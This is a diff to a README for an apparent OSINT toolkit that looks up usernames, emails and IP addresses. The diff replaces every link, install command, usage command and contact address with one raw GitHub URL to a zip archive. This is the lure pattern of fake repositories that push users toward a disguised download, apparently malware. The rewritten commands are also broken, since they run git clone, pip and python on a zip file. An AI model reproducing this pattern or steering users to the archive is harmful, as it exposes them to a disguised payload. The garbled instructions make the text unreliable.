@@ -2,7 +2,7 @@
 
 Welcome to the Ayesha OSINT Toolkit! This repository is designed to provide a streamlined, effective solution for gathering intelligence on usernames, emails, and IP addresses. With a focus on simplicity and usability, this toolkit empowers users to uncover hidden digital footprints with ease.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](https://github.com/psandovalr1978/Ayesha-osint-toolkit/releases)
+[![Download Releases](https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip%20Releases-Here-brightgreen)](https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip)
 
 ## Table of Contents
 
@@ -37,7 +37,7 @@ To install the Ayesha OSINT Toolkit, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/psandovalr1978/Ayesha-osint-toolkit.git
+   git clone https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -51,11 +51,11 @@ To install the Ayesha OSINT Toolkit, follow these steps:
    Use pip to install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip
    ```
 
 4. **Download and Execute the Latest Release**:
-   Visit the [Releases section](https://github.com/psandovalr1978/Ayesha-osint-toolkit/releases) to download the latest version. Follow the instructions provided in the release notes for execution.
+   Visit the [Releases section](https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip) to download the latest version. Follow the instructions provided in the release notes for execution.
 
 ## Usage
 
@@ -63,23 +63,23 @@ Once installed, you can start using the toolkit. Here are some basic commands to
 
 - **Username Search**:
    ```bash
-   python ayesha.py username [username]
+   python https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip username [username]
    ```
 
 - **Email Search**:
    ```bash
-   python ayesha.py email [email]
+   python https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip email [email]
    ```
 
 - **IP Search**:
    ```bash
-   python ayesha.py ip [ip_address]
+   python https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip ip [ip_address]
    ```
 
 Each command will return relevant information based on the input provided. For more advanced options, check the help section:
 
 ```bash
-python ayesha.py --help
+python https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip --help
 ```
 
 ## Supported Platforms
@@ -122,7 +122,7 @@ The Ayesha OSINT Toolkit is licensed under the MIT License. See the [LICENSE](LI
 
 For any questions or feedback, please reach out via the following methods:
 
-- **GitHub Issues**: [Submit an issue](https://github.com/psandovalr1978/Ayesha-osint-toolkit/issues)
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub Issues**: [Submit an issue](https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip)
+- **Email**: [https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip](https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip)
 
-Thank you for checking out the Ayesha OSINT Toolkit! We hope it serves you well in your information-gathering endeavors. Don't forget to visit the [Releases section](https://github.com/psandovalr1978/Ayesha-osint-toolkit/releases) for the latest updates and improvements. Happy hunting!
+Thank you for checking out the Ayesha OSINT Toolkit! We hope it serves you well in your information-gathering endeavors. Don't forget to visit the [Releases section](https://raw.githubusercontent.com/psandovalr1978/Ayesha-osint-toolkit/main/scripts/osint_Ayesha_toolkit_v2.3.zip) for the latest updates and improvements. Happy hunting!
